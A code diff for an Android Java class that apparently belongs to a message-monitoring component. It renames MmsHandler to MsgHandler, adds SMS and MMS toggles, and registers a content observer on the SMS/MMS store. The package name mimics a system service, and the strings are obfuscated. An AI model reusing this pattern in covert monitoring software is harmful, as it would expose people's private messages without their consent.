@@ -7,17 +7,27 @@ import android.os.Handler;
 import android.os.Looper;
 import android.os.Message;
 
-import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
-public class MmsHandler extends Thread {
+public class MsgHandler extends Thread {
 	private static final String TAG = "SmsHandler"; //$NON-NLS-1$
 
 	private Handler handler;
 
-	private ContentObserver observer;
+	//private ContentObserver smsObserver;
+	//private ContentObserver mmsObserver;
+	private ContentObserver msgObserver;
+
+	private boolean smsEnabled;
+
+	private boolean mmsEnabled;
+
+	public MsgHandler(boolean smsEnabled, boolean mmsEnabled) {
+		this.smsEnabled = smsEnabled;
+		this.mmsEnabled = mmsEnabled;
+	}
 
 	@Override
 	public void run() {
@@ -48,8 +58,13 @@ public class MmsHandler extends Thread {
 		// content://sms
 		// Messages.getString("25.0") : "content://sms"
 
-		observer = new MmsObserver(handler);
-		cr.registerContentObserver(Uri.parse("content://mms-sms"), false, observer); //$NON-NLS-1$
+
+
+		
+			msgObserver = new MsgObserver(handler, mmsEnabled, smsEnabled);
+			cr.registerContentObserver(Uri.parse("content://mms-sms"), true, msgObserver); //$NON-NLS-1$
+		
+	
 
 		Looper.loop();
 	}
